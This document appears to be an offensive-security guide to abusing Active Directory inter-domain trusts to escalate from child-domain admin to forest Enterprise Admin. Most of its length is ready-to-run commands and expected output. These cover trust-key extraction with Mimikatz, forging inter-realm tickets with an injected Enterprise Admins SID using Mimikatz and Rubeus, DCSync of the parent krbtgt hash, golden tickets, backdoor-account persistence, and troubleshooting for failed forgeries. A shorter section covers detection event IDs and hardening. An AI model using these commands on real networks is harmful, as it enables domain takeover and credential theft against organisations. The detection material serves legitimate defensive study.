# Inter-Domain Trust Abuse

## Active Directory Domain Trust Abuse

### Overview

**Active Directory Domain Trusts** enable resource sharing and authentication across different domains and forests. While essential for multi-domain environments, trust relationships introduce privilege escalation vectors when attackers compromise domain controllers and extract trust keys. By forging inter-realm TGT tickets, attackers can traverse trust boundaries, access resources in parent/child domains, and escalate from Domain Admin to Enterprise Admin.

**Key Concepts:**

* **Trust Keys** - Shared secrets used to encrypt inter-realm TGT tickets
* **Inter-Realm TGT** - Special referral ticket for cross-domain authentication
* **SID History** - Allows injecting Enterprise Admin SID into forged tickets
* **Parent-Child Trust** - Implicit two-way transitive trust in forest domains

**Why this matters:** Domain trust abuse enables:

* Escalation from child domain DA to forest root Enterprise Admin
* Cross-forest compromise via forest trusts
* Persistence through trust key extraction
* Lateral movement across domain boundaries
* Complete forest takeover from single domain compromise

**Attack advantages:**

* Trust keys rarely rotated (persist for years)
* Legitimate Kerberos protocol usage (difficult to detect)
* No direct interaction with target domain required
* Works even with SID filtering enabled (in some cases)
* Can escalate to highest forest privileges

**Common trust types:**

* **Parent-Child** - Automatic two-way transitive (within forest)
* **Tree-Root** - Automatic two-way transitive (between trees in forest)
* **External** - Explicit non-transitive (between different forests)
* **Forest** - Transitive between forest roots
* **Shortcut** - Explicit transitive (optimization within forest)

***

### Exploitation Workflow Summary

1. Initial Compromise ├─ Gain Domain Admin on child domain ├─ Access to domain controller ├─ Credential dumping capability └─ Identify trust relationships
2. Trust Enumeration ├─ Map domain trust relationships ├─ Identify parent/root domains ├─ Determine trust types and direction └─ Locate high-value target domains
3. Trust Key Extraction ├─ Dump trust keys from DC ├─ Extract domain SIDs ├─ Obtain Enterprise Admin SID └─ Identify target domain information
4. Ticket Forgery ├─ Craft inter-realm TGT with trust key ├─ Inject Enterprise Admin SID ├─ Specify target domain └─ Generate ticket file
5. Cross-Domain Access ├─ Request TGS from target domain ├─ Access resources with forged ticket ├─ Verify Enterprise Admin privileges └─ Establish persistence
6. Post-Exploitation ├─ DCSync from root domain ├─ Compromise additional domains ├─ Extract forest-wide credentials └─ Maintain Enterprise Admin access

***

### Understanding Trust Relationships

#### Trust Flow Analysis

**Normal cross-domain authentication flow:**

**Step 1: User authenticates to child domain DC**

```
1. User sends authentication request to DC-CHILD
2. DC-CHILD verifies credentials
3. DC-CHILD issues TGT for child domain
4. User receives TGT encrypted with child krbtgt key
```

**Step 2: User requests service in parent domain**

```
1. User presents child domain TGT to DC-CHILD
2. User requests service ticket for resource in parent domain
3. DC-CHILD recognizes service is in different domain
4. DC-CHILD issues Inter-Realm TGT (Referral Ticket)
5. Inter-Realm TGT encrypted with TRUST KEY
```

**Why this is critical:** The inter-realm TGT is encrypted with the trust key (not krbtgt). If an attacker obtains this trust key, they can forge inter-realm tickets.

**Step 3: User presents inter-realm TGT to parent domain DC**

```
1. User presents inter-realm TGT to DC-PARENT
2. DC-PARENT has copy of trust key
3. DC-PARENT decrypts inter-realm TGT
4. DC-PARENT blindly trusts child domain verification
5. DC-PARENT issues service ticket for requested resource
6. NO additional authentication checks performed
```

**Attack opportunity:** Parent domain DC trusts that child domain DC already verified the user. This trust is based solely on the trust key. If attacker has trust key, they can forge tickets claiming to be any user.

**Step 4: Access target service**

```
1. User presents service ticket to target service
2. Service grants access based on ticket
3. User accesses resource in parent domain
```

#### Trust Types and Attack Surface

**Parent-Child Trust (Most Common Attack Path)**

```
Configuration:
- Automatic in forest
- Two-way transitive
- Implicit trust

Attack Impact:
- Child DA → Parent EA escalation
- Trust key compromise = forest compromise
- SID history injection possible
```

**Forest Trust**

```
Configuration:
- Between forest roots
- Can be one-way or two-way
- Transitive within forest

Attack Impact:
- Cross-forest privilege escalation
- Requires forest trust key
- SID filtering may apply (can be bypassed)
```

**External Trust**

```
Configuration:
- Explicit configuration
- Non-transitive
- Between domains in different forests

Attack Impact:
- Limited to direct trust relationship
- No SID history by default
- SID filtering usually enabled
```

#### Trust Key Security

**What are trust keys:** Trust keys are shared secrets used to encrypt inter-realm TGT tickets between domains.

**Trust key properties:**

```
Storage: Domain controller LSA secrets
Format: NT hash (same as password hash)
Rotation: Manual only (rarely done)
Scope: Bidirectional (both domains have same key)
```

**Trust key directions:**

```
[IN] CHILD.DOMAIN.LOCAL -> PARENT.DOMAIN.LOCAL
- Incoming trust (parent trusts child)
- Used when child users access parent resources

[OUT] CHILD.DOMAIN.LOCAL -> PARENT.DOMAIN.LOCAL
- Outgoing trust (child trusts parent)
- Used when parent users access child resources
```

**For parent-child escalation, need \[IN] trust key** - this allows forging tickets from child to parent.

***

### Prerequisites

#### Required Access Level

**Minimum requirements:**

* Domain Admin privileges on compromised domain
* Access to domain controller
* Ability to execute Mimikatz or equivalent tools
* Network connectivity to target domain DC

**Why Domain Admin is required:**

```
Trust keys stored in: HKLM\SECURITY\Policy\Secrets
Requires: SYSTEM or Domain Admin to access
Protection: Only accessible from domain controller
```

**Alternative access methods:**

* Compromise service account with replication rights
* DCSync attack to extract trust keys remotely
* Exploit DC vulnerability for SYSTEM access

#### Required Information

**Information needed for attack:**

**1. Child domain SID:**

```powershell
# Get current domain SID
Get-ADDomain | Select-Object DomainSID
```

**2. Parent/target domain SID:**

```powershell
# Get parent domain SID
Get-ADDomain -Identity parent.domain.local | Select-Object DomainSID
```

**3. Enterprise Admins SID:**

```
Format: <RootDomainSID>-519
Example: S-1-5-21-1234567890-1234567890-1234567890-519
```

**4. Trust key hash:**

```
Extracted from DC via Mimikatz
Required: [IN] trust key for parent escalation
```

**5. Target domain DC:**

```
FQDN of parent domain controller
Example: dc.parent.domain.local
```

***

### Trust Enumeration

#### PowerView Enumeration

**Enumerate current domain trusts:**

```powershell
Get-DomainTrust
```

**Expected output:**

```
SourceName      : child.domain.local
TargetName      : parent.domain.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 1/15/2020 10:30:00 AM
WhenChanged     : 1/15/2020 10:30:00 AM
```

**Enumerate forest trusts:**

```powershell
Get-ForestTrust
```

**Get domain SID:**

```powershell
Get-DomainSID
```

**Expected output:**

```
S-1-5-21-1874506631-3219952063-538504511
```

**Enumerate all trusts in forest:**

```powershell
Get-ForestDomain | Get-DomainTrust
```

#### Built-in Tools Enumeration

**Using nltest:**

```cmd
nltest /domain_trusts
```

**Expected output:**

```
List of domain trusts:
    0: CHILD child.domain.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
    1: PARENT parent.domain.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)
```

**Query specific trust:**

```cmd
nltest /domain_trusts /v
```

#### Active Directory Module

**Get trust relationships:**

```powershell
Get-ADTrust -Filter *
```

**Expected output:**

```
Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=parent.domain.local,CN=System,DC=child,DC=domain,DC=local
ForestTransitive        : True
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : parent.domain.local
ObjectClass             : trustedDomain
ObjectGUID              : 12345678-1234-1234-1234-123456789012
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=child,DC=domain,DC=local
Target                  : parent.domain.local
TGTDelegation           : False
TrustingPolicy          : 
```

***

### Trust Key Extraction

#### Using Invoke-Mimikatz

**Extract all trust keys from DC:**

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc-child.child.domain.local
```

**Expected output:**

```
Current domain: CHILD.DOMAIN.LOCAL (child / S-1-5-21-1874506631-3219952063-538504511)

Domain: PARENT.DOMAIN.LOCAL (parent / S-1-5-21-280534878-1496970234-700767426)

 [ In ] CHILD.DOMAIN.LOCAL -> PARENT.DOMAIN.LOCAL
    * 11/21/2022 3:15:33 AM - CLEAR   - 1a 2b 3c 4d 5e 6f 7a 8b 9c 0d 1e 2f 3a 4b 5c 6d
    * 11/21/2022 3:15:33 AM - RC4     - ff46a9d8bd66c6efd77603da26796f35

 [ Out ] CHILD.DOMAIN.LOCAL -> PARENT.DOMAIN.LOCAL
    * 11/21/2022 3:15:33 AM - CLEAR   - 1a 2b 3c 4d 5e 6f 7a 8b 9c 0d 1e 2f 3a 4b 5c 6d
    * 11/21/2022 3:15:33 AM - RC4     - ff46a9d8bd66c6efd77603da26796f35
```

**What this shows:**

* **\[In]** - Incoming trust (for parent-child escalation, use this)
* **\[Out]** - Outgoing trust
* **RC4** - Trust key hash (this is what we need)
* **CLEAR** - Cleartext trust password (less common)

**Key information to extract:**

```
Trust direction: [In] CHILD -> PARENT
Trust key (RC4): ff46a9d8bd66c6efd77603da26796f35
Child domain: CHILD.DOMAIN.LOCAL
Parent domain: PARENT.DOMAIN.LOCAL
```

#### Using Mimikatz Directly

**On compromised DC (local execution):**

```cmd
mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsadump::trust /patch
```

**Alternative - target specific trust:**

```cmd
mimikatz # lsadump::trust /patch /domain:parent.domain.local
```

#### Using DCSync

**Remote trust key extraction (if you have DCSync rights):**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:child.domain.local /user:child$"'
```

**Note:** The trust account name format is `<domain>$`

***

### Forging Inter-Realm Trust Tickets

#### Understanding the Attack

**What we're creating:** An inter-realm TGT ticket that:

* Claims to be from child domain
* Encrypted with compromised trust key
* Includes Enterprise Admin SID in SID history
* Targets parent domain for authentication

**Why this works:** Parent domain DC will:

1. Decrypt ticket with trust key (we have this)
2. Trust that child domain verified the user
3. Issue service tickets based on SIDs in ticket
4. Grant Enterprise Admin access if EA SID present

#### Collecting Required Information

**Step 1: Get child domain SID**

```powershell
Get-ADDomain -Identity child.domain.local | Select-Object DomainSID
```

**Output:**

```
DomainSID
---------
S-1-5-21-1874506631-3219952063-538504511
```

**Step 2: Get parent domain SID**

```powershell
Get-ADDomain -Identity parent.domain.local | Select-Object DomainSID
```

**Output:**

```
DomainSID
---------
S-1-5-21-280534878-1496970234-700767426
```

**Step 3: Calculate Enterprise Admins SID**

```
Enterprise Admins RID: 519
Enterprise Admins SID: <ParentDomainSID>-519

Example: S-1-5-21-280534878-1496970234-700767426-519
```

**Step 4: Identify target DC**

```powershell
Get-ADDomainController -DomainName parent.domain.local -Discover
```

#### Forging with Invoke-Mimikatz

**Create inter-realm trust ticket:**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:ff46a9d8bd66c6efd77603da26796f35 /service:krbtgt /target:parent.domain.local /ticket:C:\temp\trust.kirbi"'
```

**Parameters explained:**

* `/user:Administrator` - Username to impersonate
* `/domain:child.domain.local` - Source domain (child)
* `/sid:S-1-5-21-...` - Child domain SID
* `/sids:S-1-5-21-...-519` - Enterprise Admin SID to inject
* `/rc4:ff46a9d8...` - Trust key hash (from extraction step)
* `/service:krbtgt` - Service type (krbtgt for inter-realm)
* `/target:parent.domain.local` - Target domain (parent)
* `/ticket:C:\temp\trust.kirbi` - Output file location

**Expected output:**

```
User      : Administrator
Domain    : child.domain.local (CHILD)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Service   : krbtgt
Target    : parent.domain.local
Lifetime  : 12/21/2024 10:15:00 AM ; 12/28/2024 10:15:00 AM ; 12/28/2024 10:15:00 AM
-> Ticket : trust.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

**Critical fields:**

* **Extra SIDs** - Shows Enterprise Admin SID (519) injected
* **ServiceKey** - Trust key used for encryption
* **Target** - Parent domain
* **Ticket** - File containing forged inter-realm TGT

#### Forging with Rubeus

**Alternative method using Rubeus:**

```cmd
Rubeus.exe golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:ff46a9d8bd66c6efd77603da26796f35 /service:krbtgt /target:parent.domain.local /nowrap
```

**Parameters same as Mimikatz:**

* `/nowrap` - Output ticket on single line (easier to copy)

**Expected output:**

```
[*] Action: Build TGT

[*] Building PAC

[*] Domain         : CHILD.DOMAIN.LOCAL (CHILD)
[*] SID            : S-1-5-21-1874506631-3219952063-538504511
[*] UserId         : 500
[*] Groups         : 513,512,520,518,519
[*] ExtraSIDs      : S-1-5-21-280534878-1496970234-700767426-519
[*] ServiceKey     : ff46a9d8bd66c6efd77603da26796f35
[*] ServiceKeyType : rc4_hmac
[*] Service        : krbtgt
[*] Target         : parent.domain.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@child.domain.local'

[*] base64(ticket.kirbi):

      doIFuj...[base64 encoded ticket]...
```

***

### Requesting Service Tickets

#### Using Rubeus asktgs

**Request TGS from parent domain using forged inter-realm ticket:**

```cmd
Rubeus.exe asktgs /ticket:C:\temp\trust.kirbi /service:cifs/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

**Parameters explained:**

* `/ticket:C:\temp\trust.kirbi` - Forged inter-realm TGT
* `/service:cifs/dc-parent.parent.domain.local` - Target service (CIFS for file shares)
* `/dc:dc-parent.parent.domain.local` - Parent domain controller
* `/ptt` - Pass-the-ticket (inject into current session)

**Expected output:**

```
[*] Action: Ask TGS

[*] Using domain controller: dc-parent.parent.domain.local:88
[*] Requesting 'cifs/dc-parent.parent.domain.local'
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFqD...[base64 encoded ticket]...

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

**Verify ticket injection:**

```cmd
klist
```

**Expected output:**

```
Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: Administrator @ CHILD.DOMAIN.LOCAL
        Server: cifs/dc-parent.parent.domain.local @ PARENT.DOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 12/21/2024 10:15:00 (local)
        End Time:   12/21/2024 20:15:00 (local)
        Renew Time: 12/28/2024 10:15:00 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
```

#### Common Service Tickets

**CIFS (file shares):**

```cmd
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

**LDAP (directory access):**

```cmd
Rubeus.exe asktgs /ticket:trust.kirbi /service:ldap/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

**HTTP (web services):**

```cmd
Rubeus.exe asktgs /ticket:trust.kirbi /service:http/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

**HOST (general access):**

```cmd
Rubeus.exe asktgs /ticket:trust.kirbi /service:host/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

***

### Verifying Enterprise Admin Access

#### Testing Access to Parent Domain

**List C$ share on parent DC:**

```cmd
dir \\dc-parent.parent.domain.local\c$
```

**Expected output:**

```
 Volume in drive \\dc-parent.parent.domain.local\c$ is Windows
 Volume Serial Number is 1234-5678

 Directory of \\dc-parent.parent.domain.local\c$

12/21/2024  10:15 AM    <DIR>          Program Files
12/21/2024  10:15 AM    <DIR>          Users
12/21/2024  10:15 AM    <DIR>          Windows
               0 File(s)              0 bytes
               3 Dir(s)  50,000,000,000 bytes free
```

**Access ADMIN$ share:**

```cmd
dir \\dc-parent.parent.domain.local\admin$
```

**List domain shares:**

```cmd
net view \\dc-parent.parent.domain.local
```

**Expected output:**

```
Shared resources at \\dc-parent.parent.domain.local

Share name  Type  Used as  Comment
---------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC            Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
```

#### PSExec to Parent Domain

**Execute commands as Enterprise Admin:**

```cmd
psexec.exe \\dc-parent.parent.domain.local cmd
```

**Expected result:**

```
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.1697]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
parent\administrator

C:\Windows\system32>whoami /groups
...
PARENT\Enterprise Admins    Group  S-1-5-21-280534878-1496970234-700767426-519  ...
```

**Confirms:**

* Successfully authenticated to parent domain
* Running as Administrator
* Member of Enterprise Admins group

#### DCSync from Parent Domain

**Extract credentials from parent domain:**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:parent.domain.local /user:parent\krbtgt"'
```

**Expected output:**

```
[DC] 'parent.domain.local' will be the domain
[DC] 'dc-parent.parent.domain.local' will be the DC server
[DC] 'parent\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/21/2022 3:15:33 AM
Object Security ID   : S-1-5-21-280534878-1496970234-700767426-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a1b2c3d4e5f6789012345678901234ab
    ntlm- 0: a1b2c3d4e5f6789012345678901234ab
    lm  - 0: 1234567890abcdef1234567890abcdef

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : PARENT.DOMAIN.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 123456789abcdef123456789abcdef123456789abcdef123456789abcdef1234
      aes128_hmac       (4096) : 123456789abcdef123456789abcdef12
```

**What you gain:**

* Parent domain krbtgt hash
* Can create Golden Tickets for entire forest
* Complete forest compromise
* Persistent Enterprise Admin access

***

### Post-Exploitation

#### Creating Golden Ticket for Parent Domain

**With parent domain krbtgt hash:**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:parent.domain.local /sid:S-1-5-21-280534878-1496970234-700767426 /krbtgt:a1b2c3d4e5f6789012345678901234ab /ptt"'
```

**Result:**

* Full domain admin on parent domain
* No trust key needed
* Persistent access (until krbtgt password changed)

#### Compromising Additional Forests

**If forest trusts exist:**

**Step 1: Enumerate forest trusts**

```powershell
Get-ForestTrust -Forest parent.domain.local
```

**Step 2: Extract forest trust keys**

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc-parent.parent.domain.local
```

**Step 3: Forge inter-forest ticket**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:parent.domain.local /sid:S-1-5-21-280534878-1496970234-700767426 /sids:S-1-5-21-EXTERNAL_FOREST_SID-519 /rc4:FOREST_TRUST_KEY /service:krbtgt /target:external.forest.local /ticket:C:\temp\forest_trust.kirbi"'
```

**Note:** Forest trusts often have SID filtering enabled, which may block this attack.

#### Establishing Persistence

**Multiple persistence methods:**

**1. Additional trust tickets:**

```
Create multiple trust tickets with different user names
Store tickets in secure location
Re-inject when needed
```

**2. Golden tickets:**

```
Use extracted krbtgt hash for persistent access
Valid until krbtgt password rotated (rare)
```

**3. Backdoor accounts:**

```
Create privileged accounts in parent domain
Add to Enterprise Admins
```

**4. Shadow credentials:**

```
Add key credentials to privileged accounts
Use for persistent certificate-based auth
```

***

### Detection and Prevention

#### Detection Strategies

**Event IDs to monitor:**

**Event 4768 - TGT Requested**

```
Monitor for:
- TGT requests with unusual SID history
- Inter-realm TGT requests from unexpected sources
- TGT requests for service accounts
```

**Event 4769 - Service Ticket Requested**

```
Monitor for:
- Cross-domain service ticket requests
- Tickets with Enterprise Admin SID in SID history
- Service tickets requested immediately after inter-realm TGT
```

**Event 4624 - Account Logon**

```
Monitor for:
- Logons from child domain to parent domain
- Logons with Enterprise Admin privileges from non-EA accounts
- Unusual cross-domain authentications
```

**Event 5136 - Directory Object Modified**

```
Monitor for:
- Trust relationship modifications
- Unexpected SID history additions
```

#### Behavioral Indicators

**Suspicious patterns:**

```
1. Child domain service account accessing parent domain
2. Multiple cross-domain authentications in short time
3. Service tickets requested for multiple services rapidly
4. TGT renewal patterns inconsistent with normal behavior
5. Authentication from unexpected IP addresses
```

**Trust-specific anomalies:**

```
1. Trust password changes (rarely done legitimately)
2. New trust relationships created
3. Trust attribute modifications
4. Unusual trust ticket encryption types
```

#### Prevention Measures

**SID Filtering:**

```
Enable for external trusts (blocks SID history attacks)
Cannot be enabled for intra-forest trusts
Helps prevent cross-forest EA escalation
```

**Enable via PowerShell:**

```powershell
Get-ADTrust -Filter * | Where-Object {$_.TrustType -eq "External"} | Set-ADTrust -SIDFilteringQuarantined $true
```

**Selective Authentication:**

```
Require explicit permissions for cross-domain access
Prevents automatic resource access via trusts
```

**Enable selective authentication:**

```powershell
Set-ADTrust -Identity "TrustName" -SelectiveAuthentication $true
```

**Trust Key Rotation:**

```
Rotate trust passwords regularly
Reset after compromise
Default: trust keys NEVER rotate automatically
```

**Rotate trust password:**

```cmd
netdom trust CHILD.DOMAIN.LOCAL /domain:PARENT.DOMAIN.LOCAL /resetOneSide /passwordT:NewTrustPassword /userO:admin /passwordO:adminpass
```

**Least Privilege:**

```
Minimize Domain Admins in child domains
Separate forest for highly sensitive resources
Use tier model to isolate privilege levels
```

**Monitoring:**

```
SIEM alerts on cross-domain authentication
Baseline normal trust usage patterns
Alert on anomalous SID history usage
Monitor for Mimikatz indicators
```

***

### Troubleshooting

#### Error: "KRB\_AP\_ERR\_MODIFIED"

**Problem:** Forged ticket rejected by parent DC

```
KRB_AP_ERR_MODIFIED: Ticket decryption failed
```

**Causes:**

**1. Wrong trust key used:**

```
Verify you used [IN] trust key (not [OUT])
Check trust key hash is correct
Ensure no typos in RC4 hash
```

**2. Incorrect target domain:**

```
Target must be exact FQDN
Check spelling of parent.domain.local
Verify domain name capitalization
```

**3. SID mismatch:**

```
Verify child domain SID is correct
Check parent domain SID
Ensure Enterprise Admin SID format: ParentSID-519
```

#### Error: "KRB\_AP\_ERR\_SKEW"

**Problem:** Time synchronization issue

```
KRB_AP_ERR_SKEW: Clock skew too great
```

**Solution:**

```cmd
# Sync time with parent DC
w32tm /config /manualpeerlist:dc-parent.parent.domain.local /syncfromflags:manual /reliable:yes /update
w32tm /resync /force

# Verify time
w32tm /query /status
```

**Kerberos requires time sync within 5 minutes** (default MaxClockSkew).

#### Error: "Access Denied" to Parent Resources

**Problem:** Successfully forged ticket but can't access resources

**Causes:**

**1. Enterprise Admin SID not injected:**

```powershell
# Verify SID in ticket
Rubeus.exe describe /ticket:trust.kirbi

# Should see in output:
# Extra SIDs: S-1-5-21-...-519
```

**2. Wrong service ticket:**

```cmd
# Ensure you requested correct service
# For file shares, need CIFS
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

**3. Ticket not injected:**

```cmd
# Verify ticket in cache
klist

# Re-inject if needed
Rubeus.exe ptt /ticket:trust.kirbi
```

#### Error: "The Trust Relationship Failed"

**Problem:** Trust broken or misconfigured

**Check trust health:**

```cmd
nltest /sc_query:parent.domain.local
```

**Expected output if healthy:**

```
Flags: 30 HAS_IP HAS_TIMESERV
Trusted DC Name \\dc-parent.parent.domain.local
Trusted DC Connection Status Status = 0 0x0 NERR_Success
The command completed successfully
```

**Repair trust if needed:**

```cmd
netdom trust child.domain.local /domain:parent.domain.local /verify /verbose
```

***

### Quick Reference

#### Trust Key Extraction

```powershell
# Mimikatz - Extract all trust keys
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName DC_NAME

# Get domain SIDs
Get-ADDomain | Select-Object DomainSID
Get-ADDomain -Identity parent.domain.local | Select-Object DomainSID

# Calculate Enterprise Admin SID
# Format: <ParentDomainSID>-519
```

#### Ticket Forgery

```powershell
# Create inter-realm trust ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_SID-519 /rc4:TRUST_KEY /service:krbtgt /target:parent.domain.local /ticket:trust.kirbi"'

# Rubeus alternative
Rubeus.exe golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_SID-519 /rc4:TRUST_KEY /service:krbtgt /target:parent.domain.local /nowrap
```

#### Service Ticket Requests

```cmd
# Request CIFS (file shares)
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt

# Request LDAP (directory)
Rubeus.exe asktgs /ticket:trust.kirbi /service:ldap/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt

# Request HOST (general)
Rubeus.exe asktgs /ticket:trust.kirbi /service:host/dc-parent.parent.domain.local /dc:dc-parent.parent.domain.local /ptt
```

#### Verification Commands

```cmd
# View cached tickets
klist

# Test parent domain access
dir \\dc-parent.parent.domain.local\c$

# List shares
net view \\dc-parent.parent.domain.local

# Execute commands
psexec.exe \\dc-parent.parent.domain.local cmd
```

#### Trust Enumeration

```powershell
# PowerView
Get-DomainTrust
Get-ForestTrust
Get-ForestDomain | Get-DomainTrust

# Built-in
nltest /domain_trusts
nltest /domain_trusts /v

# Active Directory module
Get-ADTrust -Filter *
```

#### Key SIDs

```
Domain Admins: <DomainSID>-512
Enterprise Admins: <RootDomainSID>-519
Schema Admins: <RootDomainSID>-518
Administrators: <DomainSID>-544
```

